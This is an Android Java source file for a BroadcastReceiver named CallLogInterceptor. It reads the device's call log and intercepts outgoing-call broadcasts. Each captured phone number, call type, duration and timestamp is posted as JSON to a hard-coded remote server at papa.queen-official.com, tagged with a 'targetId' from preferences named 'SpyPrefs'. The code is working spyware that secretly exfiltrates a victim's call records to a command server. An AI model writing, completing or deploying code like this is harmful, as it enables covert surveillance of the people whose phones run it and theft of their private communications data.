package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences; // Tambahkan import ini
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CallLogInterceptor extends BroadcastReceiver {
    private static final String TAG = "CRPT.CallLog";
    private static final String SERVER_URL = "http://papa.queen-official.com:2949/api/post-response/";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
            String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            sendCallLogToServer(context, number, "OUTGOING", 0);
        } else {
            captureLastCall(context);
        }
    }
    
    private void captureLastCall(Context context) {
        try {
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 1"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                
                String callType;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE: callType = "INCOMING"; break;
                    case CallLog.Calls.MISSED_TYPE: callType = "MISSED"; break;
                    default: callType = "UNKNOWN";
                }
                
                sendCallLogToServer(context, number, callType, duration);
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error capturing call log: " + e.getMessage());
        }
    }
    
    private void sendCallLogToServer(Context context, String number, String type, int duration) {
        new Thread(() -> {
            try {
                // Perbaikan: Gunakan context yang dikirim dari parameter
                SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "unknown");
                
                URL url = new URL(SERVER_URL + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject payload = new JSONObject();
                payload.put("cmd", "call_log");
                JSONObject data = new JSONObject();
                data.put("number", number);
                data.put("type", type);
                data.put("duration", duration);
                data.put("date", System.currentTimeMillis());
                payload.put("data", data);
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending call log: " + e.getMessage());
            }
        }).start();
    }
}